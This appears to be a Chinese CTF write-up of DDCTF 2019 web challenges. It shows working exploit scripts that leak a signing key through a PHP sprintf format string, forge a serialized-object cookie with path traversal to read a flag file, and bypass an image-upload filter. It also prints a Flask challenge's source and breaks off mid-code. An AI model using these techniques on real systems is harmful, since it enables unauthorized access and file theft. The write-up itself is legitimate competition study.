<p>POST /app/Session.php HTTP/1.1<br>Host: 117.51.158.44<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate<br>Connection: close<br>Upgrade-Insecure-Requests: 1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 12<br>didictf_username: admin</p>
<p>nickname=123</p>
</blockquote>
<p><strong>response:</strong></p>
<blockquote>
<p>HTTP/1.1 200 OK<br>Server: nginx/1.10.3 (Ubuntu)<br>Date: Thu, 18 Apr 2019 10:19:23 GMT<br>Content-Type: application/json<br>Connection: close<br>Set-Cookie: ddctf_id=a%3A4%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%224b42d9a8f4e766b08ca9125762bf0d45%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A14%3A%22101.207.121.38%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A78%3A%22Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A66.0%29+Gecko%2F20100101+Firefox%2F66.0%22%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D38af5d35992029e7901a61356d1f4609; expires=Thu, 18-Apr-2019 12:19:23 GMT; Max-Age=7200<br>Content-Length: 188</p>
<p>{“errMsg”:”success”,”data”:”\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458—-\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php”}{“errMsg”:”sucess”,”data”:”DiDI Welcome you %s”}</p>
</blockquote>
<p>注意到<strong>Set-Cookie</strong>字段，urldecode后：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">a</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"session_id"</span>;<span class="attribute">s</span>:<span class="number">32</span>:<span class="string">"4b42d9a8f4e766b08ca9125762bf0d45"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"ip_address"</span>;<span class="attribute">s</span>:<span class="number">14</span>:<span class="string">"101.207.121.38"</span>;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"user_agent"</span>;<span class="attribute">s</span>:<span class="number">78</span>:<span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0"</span>;<span class="attribute">s</span>:<span class="number">9</span>:<span class="string">"user_data"</span>;<span class="attribute">s</span>:<span class="number">0</span>:<span class="string">""</span>;&#125;38<span class="selector-tag">af5d35992029e7901a61356d1f4609</span></span><br></pre></td></tr></table></figure></p>
<p>另外：<br><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;"errMsg":"success","data":"<span class="symbol">\u</span>60a8<span class="symbol">\u</span>5f53<span class="symbol">\u</span>524d<span class="symbol">\u</span>5f53<span class="symbol">\u</span>524d<span class="symbol">\u</span>6743<span class="symbol">\u</span>9650<span class="symbol">\u</span>4e3a<span class="symbol">\u</span>7ba1<span class="symbol">\u</span>7406<span class="symbol">\u</span>5458----<span class="symbol">\u</span>8bf7<span class="symbol">\u</span>8bbf<span class="symbol">\u</span>95ee:app<span class="symbol">\/</span>fL2XID2i0Cdh.php"&#125;&#123;"errMsg":"sucess","data":"DiDI Welcome you <span class="variable">%s"&#125;</span></span><br></pre></td></tr></table></figure></p>
<p>回到源码：</p>
<ul>
<li>在url:app/Application.php中<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> __destruct() &#123;</span><br><span class="line">    <span class="keyword">if</span>(empty(<span class="variable">$this</span>-&gt;path)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$this</span>-&gt;sanitizepath(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$path</span>) !== <span class="number">18</span>) &#123;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;response(<span class="variable">$data</span>=file_get_contents(<span class="variable">$path</span>),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>明显意识到反序列化</p>
<ul>
<li>在url:app/Session.php中<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">            $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">            $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">            $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>进行session检查没有则创造一个session，所以访问时要设定session，往下看：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">            $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">            $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">            $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>sprinf</strong>存在格式化字符串漏洞，所以试图让他打印出<strong>key值</strong><br><a href="https://paper.seebug.org/386/#0x03-php" target="_blank" rel="noopener">sprintf漏洞</a><br>代码如下：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">import</span> requests</span><br><span class="line">   </span><br><span class="line">   <span class="attr">url</span> = 'http://<span class="number">117.51</span>.<span class="number">158.44</span>/app/Session.php'</span><br><span class="line">   </span><br><span class="line">   <span class="attr">body</span> = &#123;'nickname':'/%s'&#125;</span><br><span class="line">   <span class="attr">headers</span> = &#123;'didictf_username':'admin'&#125;</span><br><span class="line">   <span class="attr">s</span> = requests.Session()</span><br><span class="line">   </span><br><span class="line">   s.get(<span class="attr">url=url,headers=headers)</span></span><br><span class="line">   <span class="attr">response</span> = s.post(<span class="attr">url=url,headers=headers,data=body)</span></span><br><span class="line">   print(response.text)</span><br></pre></td></tr></table></figure></p>
<p>得到<code>key：EzblrbNS</code></p>
<ul>
<li>下一步就是序列化</li>
</ul>
<p>注意到这步：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">    <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">&#125;</span><br><span class="line">$session = unserialize($session);</span><br></pre></td></tr></table></figure>
<p>所以可以直接构造一个只包含flag路径的对象：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">var</span> $path = <span class="string">''</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$fuck = <span class="keyword">new</span> Application();</span></span><br><span class="line"><span class="php">$fuck-&gt;path = <span class="string">'//config/flag.txt'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> serialize($fuck);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>最终：<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">from urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://117.51.158.44/app/Session.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = <span class="string">'O:11:"Application":1:&#123;s:4:"path";s:21:"..././config/flag.txt";&#125;'</span></span><br><span class="line"><span class="keyword">data</span> =quote( <span class="keyword">data</span> + hashlib.md5(b<span class="string">'EzblrbNS'</span> + <span class="keyword">data</span>.encode()).hexdigest())</span><br><span class="line"># s = requests.Session()</span><br><span class="line"></span><br><span class="line">response = requests.get(url=url,headers=&#123;<span class="string">'didictf_username'</span>:<span class="string">'admin'</span>&#125;,cookies=&#123;<span class="string">'ddctf_id'</span>:<span class="keyword">data</span>&#125;)</span><br><span class="line">print(response.content)</span><br></pre></td></tr></table></figure></p>
<h3 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h3><blockquote>
<p>user：dd@ctf<br>pass：DD@ctf#000</p>
</blockquote>
<p>用给出的用户名和密码登录，一个文件上传页面<br>随便上传一张图，出现如下提示：</p>
<blockquote>
<p>[Check Error]上传的图片源代码中未包含指定字符串:phpinfo()</p>
</blockquote>
<p>在图片末尾添加<code>phpinfo()</code>，上传依然出现这个错误<br>查看网页图片源码，发现了一段字符串：</p>
<blockquote>
<p>REATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 80</p>
</blockquote>
<p>搜了一下，发现了一个新名词–<strong>二次渲染</strong><br>二次渲染：<a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">https://xz.aliyun.com/t/2657</a><br>文件上传总结：<a href="https://blog.csdn.net/qq_41079177/article/details/84780056" target="_blank" rel="noopener">https://blog.csdn.net/qq_41079177/article/details/84780056</a></p>
<p>会有一次处理之后得不到flag的情况，这时可以将二次渲染的图再次下载，然后再次处理，重复几次即可</p>
<p>注：<br><a href="https://www.jianshu.com/p/f3c3f4527530" target="_blank" rel="noopener">linux/windows系统如何安装php-gd扩展库</a></p>
<h3 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h3><p>主页面：</p>
<blockquote>
<p>[INFO] you have 0 diamonds, 3 points now.<br>View source code<br>Go to e-shop<br>Reset<br>Go back to index.html</p>
</blockquote>
<p>查看源码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">Download this .py file</span><br><span class="line">Go back to index.html</span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># written in python 2.7 </span></span><br><span class="line">__author__ = <span class="string">'garzon'</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response </span><br><span class="line"><span class="keyword">import</span> urllib </span><br><span class="line"></span><br><span class="line">app = Flask(__name__) </span><br><span class="line">app.secret_key = <span class="string">'*********************'</span> <span class="comment"># censored </span></span><br><span class="line">url_prefix = <span class="string">'/d5af31f66741e857'</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span><span class="params">()</span>:</span> </span><br><span class="line">    <span class="keyword">return</span> <span class="string">'FLAG_is_here_but_i_wont_show_you'</span>  <span class="comment"># censored </span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span><span class="params">(event)</span>:</span> </span><br><span class="line">    session[<span class="string">'log'</span>].append(event) </span><br><span class="line">    <span class="keyword">if</span> len(session[<span class="string">'log'</span>]) &gt; <span class="number">5</span>: session[<span class="string">'log'</span>] = session[<span class="string">'log'</span>][<span class="number">-5</span>:] </span><br><span class="line">    <span class="keyword">if</span> type(event) == type([]): </span><br><span class="line">        request.event_queue += event </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        request.event_queue.append(event) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span><span class="params">(haystack, prefix, postfix=None)</span>:</span> </span><br><span class="line">    haystack = haystack[haystack.find(prefix)+len(prefix):] </span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>: </span><br><span class="line">        haystack = haystack[:haystack.find(postfix)] </span><br><span class="line">    <span class="keyword">return</span> haystack </span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span> <span class="keyword">pass</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span><span class="params">()</span>:</span> </span><br><span class="line">    valid_event_chars = set(<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span>) </span><br><span class="line">    resp = <span class="keyword">None</span> </span><br><span class="line">    <span class="keyword">while</span> len(request.event_queue) &gt; <span class="number">0</span>: </span><br><span class="line">        event = request.event_queue[<span class="number">0</span>] <span class="comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......" </span></span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:] </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">'action:'</span>, <span class="string">'func:'</span>)): <span class="keyword">continue</span> </span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event: </span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars: <span class="keyword">break</span> </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">'a'</span> </span><br><span class="line">            action = get_mid_str(event, <span class="string">':'</span>, <span class="string">';'</span>) </span><br><span class="line">            args = get_mid_str(event, action+<span class="string">';'</span>).split(<span class="string">'#'</span>) </span><br><span class="line">            <span class="keyword">try</span>: </span><br><span class="line">                event_handler = eval(action + (<span class="string">'_handler'</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">'_function'</span>)) </span><br><span class="line">                ret_val = event_handler(args) </span><br><span class="line">            <span class="keyword">except</span> RollBackException: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                resp += <span class="string">'ERROR! All transactions have been cancelled. &lt;br /&gt;'</span> </span><br><span class="line">                resp += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">                session[<span class="string">'num_items'</span>] = request.prev_session[<span class="string">'num_items'</span>] </span><br><span class="line">                session[<span class="string">'points'</span>] = request.prev_session[<span class="string">'points'</span>] </span><br><span class="line">                <span class="keyword">break</span> </span><br><span class="line">            <span class="keyword">except</span> Exception, e: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = <span class="string">''</span> </span><br><span class="line">                <span class="comment">#resp += str(e) # only for debugging </span></span><br><span class="line">                <span class="keyword">continue</span> </span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">None</span>: </span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span>: resp = ret_val </span><br><span class="line">                <span class="keyword">else</span>: resp += ret_val </span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> resp == <span class="string">''</span>: resp = (<span class="string">'404 NOT FOUND'</span>, <span class="number">404</span>) </span><br><span class="line">    session.modified = <span class="keyword">True</span> </span><br><span class="line">    <span class="keyword">return</span> resp </span><br><span class="line">     </span><br><span class="line"><span class="meta">@app.route(url_prefix+'/') </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span><span class="params">()</span>:</span> </span><br><span class="line">    querystring = urllib.unquote(request.query_string) </span><br><span class="line">    request.event_queue = [] </span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">''</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">'action:'</span>)) <span class="keyword">or</span> len(querystring) &gt; <span class="number">100</span>: </span><br><span class="line">        querystring = <span class="string">'action:index;False#False'</span> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">'num_items'</span> <span class="keyword">not</span> <span class="keyword">in</span> session: </span><br><span class="line">        session[<span class="string">'num_items'</span>] = <span class="number">0</span> </span><br><span class="line">        session[<span class="string">'points'</span>] = <span class="number">3</span> </span><br><span class="line">        session[<span class="string">'log'</span>] = [] </span><br><span class="line">    request.prev_session = dict(session) </span><br><span class="line">    trigger_event(querystring) </span><br><span class="line">    <span class="keyword">return</span> execute_event_loop() </span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below -------------------------------------- </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    page = args[<span class="number">0</span>] </span><br><span class="line">    html = <span class="string">''</span> </span><br><span class="line">    html += <span class="string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;'</span>.format(session[<span class="string">'num_items'</span>], session[<span class="string">'points'</span>]) </span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">'index'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:index;True%23False"&gt;View source code&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;shop"&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:view;reset"&gt;Reset&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'shop'</span>: </span><br><span class="line">        html += <span class="string">'&lt;a href="./?action:buy;1"&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">'reset'</span>: </span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">'num_items'</span>] </span><br><span class="line">        html += <span class="string">'Session reset.&lt;br /&gt;'</span> </span><br><span class="line">    html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">    <span class="keyword">return</span> html </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    bool_show_source = str(args[<span class="number">0</span>]) </span><br><span class="line">    bool_download_source = str(args[<span class="number">1</span>]) </span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">'True'</span>: </span><br><span class="line">     </span><br><span class="line">        source = open(<span class="string">'eventLoop.py'</span>, <span class="string">'r'</span>) </span><br><span class="line">        html = <span class="string">''</span> </span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:index;True%23True"&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">            html += <span class="string">'&lt;a href="./?action:view;index"&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;'</span> </span><br><span class="line">             </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source: </span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">'True'</span>: </span><br><span class="line">                html += line.replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;amp;'</span>).replace(<span class="string">'\t'</span>, <span class="string">'&amp;nbsp;'</span>*<span class="number">4</span>).replace(<span class="string">' '</span>,<span class="string">'&amp;nbsp;'</span>).replace(<span class="string">'&lt;'</span>, <span class="string">'&amp;lt;'</span>).replace(<span class="string">'&gt;'</span>,<span class="string">'&amp;gt;'</span>).replace(<span class="string">'\n'</span>, <span class="string">'&lt;br /&gt;'</span>) </span><br><span class="line">            <span class="keyword">else</span>: </span><br><span class="line">                html += line </span><br><span class="line">        source.close() </span><br><span class="line">         </span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">'True'</span>: </span><br><span class="line">            headers = &#123;&#125; </span><br><span class="line">            headers[<span class="string">'Content-Type'</span>] = <span class="string">'text/plain'</span> </span><br><span class="line">            headers[<span class="string">'Content-Disposition'</span>] = <span class="string">'attachment; filename=serve.py'</span> </span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers) </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> html </span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        trigger_event(<span class="string">'action:view;index'</span>) </span><br><span class="line">         </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    num_items = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>: <span class="keyword">return</span> <span class="string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;'</span>.format(args[<span class="number">0</span>]) </span><br><span class="line">    session[<span class="string">'num_items'</span>] += num_items  </span><br><span class="line">    trigger_event([<span class="string">'func:consume_point;&#123;&#125;'</span>.format(num_items), <span class="string">'action:view;index'</span>]) </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    point_to_consume = int(args[<span class="number">0</span>]) </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'points'</span>] &lt; point_to_consume: <span class="keyword">raise</span> RollBackException() </span><br><span class="line">    session[<span class="string">'points'</span>] -= point_to_consume </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span><span class="params">(args)</span>:</span> </span><br><span class="line">    flag = args[<span class="number">0</span>] </span><br><span class="line">    <span class="comment">#return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it. </span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'You naughty boy! ;) &lt;br /&gt;'</span> </span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span><span class="params">(args)</span>:</span> </span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">'num_items'</span>] &gt;= <span 